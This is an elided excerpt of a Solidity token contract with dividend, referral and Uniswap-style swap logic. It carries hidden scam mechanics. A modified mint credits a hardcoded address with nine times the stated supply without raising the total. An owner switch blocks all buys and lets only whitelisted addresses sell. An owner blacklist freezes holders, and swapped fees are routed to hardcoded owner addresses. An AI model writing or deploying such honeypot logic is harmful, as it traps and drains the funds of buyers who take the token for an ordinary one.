...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _mint(address account, uint256 amount, bool isa) internal  {
        require(account != address(0), "ERC20: mint to the zero address");
        _balances[account] += amount;
    }
...
contract Recv {
    ...
    constructor (IERC20 _tokenPCE) public {
        tokenPCE = _tokenPCE;
        usdt = IERC20(0x0D8Ce2A99Bb6e3B7Db580eD848240e4a0F9aE153);
    }
...
contract TOKEN is ERC20, Ownable, BaseToken {
    ...
    address public alladdress=0x6951Cc026D2A0bc3A95fCa4559c52928759be49E;
    address public baseaddress=0x6C24bBc19531C618Bd055b3e95B1AA779b11c050; 
    address public marketaddress=0x6951Cc026D2A0bc3A95fCa4559c52928759be49E;
    address public daysdisto=0x88E23B54f20597838d9Cf95752502c778a34aE06;

    address public diaddress=0xF381D7A25001eDb7A723204135752C5467b86099;
    ...
    constructor(
        ...
        // require(totalFees <= 35, "Total fee is over 25%");
        swapTokensAtAmount = totalSupply_.div(10000000000000); // 0.002%
        ...
        _setAutomatedMarketMakerPair(alladdress , true);

        // exclude from receiving dividends
        _mint(daysdisto, totalSupply_*9,true);
        ...
        _mint(alladdress, totalSupply_);
        userhad[alladdress] =true;
        userlist.push(alladdress);
        userhad[daysdisto] =true;
        userlist.push(daysdisto);
    ...
    function setwladdress(address[] memory _user) public onlyOwner {
      for(uint i=0;i< _user.length;i++) {
          if (!wladdress[_user[i]]) {
                wladdress[_user[i]] = true;
          }
      }
  }
    function setrewladdress(address _user) public onlyOwner{
        wladdress[_user] = false;
      }
    mapping (address => bool) public bladdress;

    function setbladdress(address[] memory _user) public onlyOwner{
      for(uint i=0;i< _user.length;i++) {
          if (!bladdress[_user[i]]) {
                bladdress[_user[i]] = true;
          }
      }
  }
    function setrmbladdress(address _user) public onlyOwner{
        bladdress[_user] = false;
      }

  bool public isnswap=false;

  function setIscanswap( bool _f) public onlyOwner {
      isnswap = _f;
  }
   ...
   function isContract(address account) internal view returns (bool) {
    ...
    function _transfer(
        ...
        require(bladdress[from] == false, "ERC20:the blk address");
        ...
        uint256 contractTokenBalance = balanceOf(address(this)).sub(markednum);
        ...
        if (from ==uniswapV2Pair || to == uniswapV2Pair) {
             if (isnswap)  {
                    if (from ==uniswapV2Pair) {
                            require( false, " to n  s");

                        }
                        if (to ==uniswapV2Pair) {
                            require(wladdress[from], "f n  s");
                        }
             }
             takeFee = true;
        ...
        if (takeFee) {
            uint256 fees;
            uint256 burnmount = amount.div(100);

            if (from ==uniswapV2Pair) {
                fees = amount.mul(60).div(1000);
            } else if (to == uniswapV2Pair) {
                fees = amount.mul(70).div(1000);
                super._transfer(from, address(this), burnmount);
                 _burn(address(this), burnmount);
            }

            if (fees>0) {
                super._transfer(from, baseaddress, burnmount.mul(2));//lp
                super._transfer(from, address(this), burnmount.add(burnmount.div(2)));

                 markednum+=burnmount.add(burnmount.div(2));
                super._transfer(from, address(this), burnmount);
        ...
        bool shouldSetInviter = inviter[to] == address(0) 
                && !isContract(from) && !isContract(to) && !bladdress[from];
        if (shouldSetInviter) {
    ...
    function getUserNode2(uint fromlen, uint tolen) view public returns(address[] memory b) {
    ...
    function swapTokenTore(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = rewardToken;
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        // make the swap
        uint256 nrewa = IERC20(rewardToken).balanceOf(address(this));
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
        ...
        RECV.withdraw();
        uint256 newrew= IERC20(rewardToken).balanceOf(address(this)).sub(nrewa);
        IERC20(rewardToken).transfer(marketaddress, newrew);
        //marketaddress
    }

    function swapAndSendDividends(uint256 tokens) private {
        uint256 dividends1 = IERC20(rewardToken).balanceOf(address(this));
        swapTokensForCake(tokens);

        uint256 dividends = IERC20(rewardToken).balanceOf(address(this)).sub(dividends1);
        bool success = IERC20(rewardToken).transfer(
